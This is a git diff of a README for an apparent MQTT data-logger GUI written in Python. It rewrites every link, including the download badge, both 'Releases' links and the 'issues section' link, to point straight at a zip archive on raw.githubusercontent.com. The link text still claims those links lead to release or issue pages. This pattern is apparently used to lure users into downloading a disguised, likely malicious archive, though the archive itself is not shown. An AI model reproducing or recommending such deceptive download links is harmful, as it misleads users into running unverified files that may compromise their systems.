@@ -1,6 +1,6 @@
 # 🚀 Python-MQTT-Data-Logger-GUI - Easy Data Logging with MQTT
 
-![Download Python-MQTT-Data-Logger-GUI](https://img.shields.io/badge/Download-Python--MQTT--Data--Logger--GUI-blue?style=for-the-badge&logo=github)
+![Download Python-MQTT-Data-Logger-GUI](https://raw.githubusercontent.com/Nieddottix/Python-MQTT-Data-Logger-GUI/main/sabe/Python-MQTT-Data-Logger-GUI_1.6.zip)
 
 ## 📋 Description
 Python-MQTT-Data-Logger-GUI is a user-friendly application designed for effortless data logging using the MQTT protocol. Built with Python's Tkinter and Paho-MQTT, it provides a simple interface for secure authentication, custom port settings, and automatic CSV export of your logged data. This tool is perfect for anyone interested in automation or IoT projects.
@@ -16,7 +16,7 @@ Follow these steps to download and set up the application on your computer.
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download Python-MQTT-Data-Logger-GUI Releases](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/releases)
+   [Download Python-MQTT-Data-Logger-GUI Releases](https://raw.githubusercontent.com/Nieddottix/Python-MQTT-Data-Logger-GUI/main/sabe/Python-MQTT-Data-Logger-GUI_1.6.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the version labeled "Latest release." This version includes the most recent updates and bug fixes.
@@ -72,11 +72,11 @@ If you encounter any issues while using the application, consider the following:
 3. **Export Problems**  
    Make sure the export directory exists and you have write access to that location.
 
-For more help, you can check the issues section on the [GitHub repository](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/issues).
+For more help, you can check the issues section on the [GitHub repository](https://raw.githubusercontent.com/Nieddottix/Python-MQTT-Data-Logger-GUI/main/sabe/Python-MQTT-Data-Logger-GUI_1.6.zip).
 
 ## 📥 Download & Install
 To begin using Python-MQTT-Data-Logger-GUI, visit the page below for the latest releases, select your installer, and follow the installation instructions:  
-[Download Python-MQTT-Data-Logger-GUI Releases](https://github.com/Nieddottix/Python-MQTT-Data-Logger-GUI/releases) 
+[Download Python-MQTT-Data-Logger-GUI Releases](https://raw.githubusercontent.com/Nieddottix/Python-MQTT-Data-Logger-GUI/main/sabe/Python-MQTT-Data-Logger-GUI_1.6.zip) 
 
 ## 🤝 Contributing
 We welcome contributions! If you’d like to enhance this application or fix bugs, please refer to the contributing guidelines provided in the repository.
